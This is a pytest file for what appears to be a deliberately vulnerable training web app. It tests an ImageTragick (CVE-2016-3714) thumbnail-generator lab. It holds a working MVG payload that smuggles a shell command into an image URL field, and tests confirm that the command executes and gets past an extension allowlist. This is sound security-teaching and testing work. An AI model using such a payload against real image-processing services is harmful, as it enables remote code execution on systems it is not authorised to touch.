import io
import os
import shutil
import subprocess

import pytest

from app.categories.a06_vulnerable_components.routes import IMAGETRAGICK_PROOF_PATH

IMAGETRAGICK_PAYLOAD = (
    b"push graphic-context\n"
    b"viewbox 0 0 640 480\n"
    b"fill 'url(https://example.com/image.jpg\"|id > "
    b"/tmp/a06_imagetragick_proof.txt;false\")'\n"
    b"pop graphic-context\n"
)


def _convert_version_string():
    convert_path = shutil.which("convert")
    if not convert_path:
        return None
    result = subprocess.run([convert_path, "-version"], capture_output=True, text=True)
    return result.stdout


requires_vulnerable_imagemagick = pytest.mark.skipif(
    "ImageMagick 6.9.2-10" not in (_convert_version_string() or ""),
    reason="requires the exact pre-CVE-2016-3714-fix ImageMagick 6.9.2-10 this "
    "app's real Docker image compiles from vendor/ImageMagick-6.9.2-10.tar.xz; "
    "a local test environment's ImageMagick (if any) is a different, patched version",
)


@pytest.fixture(autouse=True)
def _clean_proof_file():
    if os.path.exists(IMAGETRAGICK_PROOF_PATH):
        os.remove(IMAGETRAGICK_PROOF_PATH)
    yield
    if os.path.exists(IMAGETRAGICK_PROOF_PATH):
        os.remove(IMAGETRAGICK_PROOF_PATH)


def test_thumbnail_generator_page_renders(client):
    response = client.get("/a06/thumbnail-generator")
    assert response.status_code == 200
    assert b"ImageTragick" in response.data


def test_thumbnail_generator_filtered_page_renders(client):
    response = client.get("/a06/thumbnail-generator-filtered")
    assert response.status_code == 200


def test_filtered_route_blocks_a_non_image_extension(client):
    data = {"image": (io.BytesIO(b"not an image at all"), "payload.mvg")}
    response = client.post(
        "/a06/thumbnail-generator-filtered", data=data, content_type="multipart/form-data"
    )
    assert response.status_code == 200
    assert not os.path.exists(IMAGETRAGICK_PROOF_PATH)


@requires_vulnerable_imagemagick
def test_imagetragick_payload_achieves_rce_via_thumbnail_generator(client):
    data = {"image": (io.BytesIO(IMAGETRAGICK_PAYLOAD), "poc.jpg")}
    response = client.post(
        "/a06/thumbnail-generator", data=data, content_type="multipart/form-data"
    )
    assert response.status_code == 200

    # the injected command genuinely executed on the real filesystem -- not
    # merely that the route accepted the input without erroring
    assert os.path.exists(IMAGETRAGICK_PROOF_PATH)
    with open(IMAGETRAGICK_PROOF_PATH) as f:
        proof_content = f.read()
    assert "uid=" in proof_content

    body = response.data.decode()
    assert "uid=" in body


@requires_vulnerable_imagemagick
def test_imagetragick_payload_bypasses_extension_allowlist(client):
    # The exact same payload as the base example, merely named "poc.jpg" --
    # already satisfies the filtered route's ".jpg/.jpeg/.png/.gif" check.
    data = {"image": (io.BytesIO(IMAGETRAGICK_PAYLOAD), "poc.jpg")}
    response = client.post(
        "/a06/thumbnail-generator-filtered", data=data, content_type="multipart/form-data"
    )
    assert response.status_code == 200

    assert os.path.exists(IMAGETRAGICK_PROOF_PATH)
    with open(IMAGETRAGICK_PROOF_PATH) as f:
        proof_content = f.read()
    assert "uid=" in proof_content
